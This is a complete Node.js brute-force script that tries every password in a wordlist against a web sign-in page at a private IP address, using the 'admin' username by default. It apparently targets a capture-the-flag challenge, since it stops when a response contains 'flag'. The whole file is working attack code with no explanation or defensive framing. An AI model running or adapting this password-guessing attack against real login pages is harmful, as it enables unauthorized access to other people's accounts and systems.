const fs = require('fs');
const fetch = require('node-fetch');

const baseUrl = 'http://10.12.100.119/?page=signin';

async function tryPassword(username, password) {
    try {
        const url = `${baseUrl}&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&Login=Login`;
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });
        
        const text = await response.text();
        
        if (text.toLowerCase().includes('flag')) {
            console.log(`SUCCESS! Password found: ${password}`);
            console.log(`Response: ${text}`);
            return true;
        } else {
            console.log(`Failed with password: ${password}`);
            return false;
        }
    } catch (error) {
        console.error(`Error with password ${password}: ${error}`);
        return false;
    }
}

async function bruteForceLogin(passwordFile, username = 'admin') {
    try {
        const passwords = fs.readFileSync(passwordFile, 'utf8')
                           .split('\n')
                           .map(p => p.trim())
                           .filter(p => p.length > 0);

        console.log(`Loaded ${passwords.length} passwords`);

        for (const password of passwords) {
            const success = await tryPassword(username, password);
            if (success) {
                break;
            }
        }
        
        console.log('Brute force attempt completed');
    } catch (error) {
        console.error('Error reading password file:', error);
    }
}

// Usage: node script.js passwords.txt [username]
const passwordFile = process.argv[2] || 'passwords.txt';
const username = process.argv[3] || 'admin';

bruteForceLogin(passwordFile, username);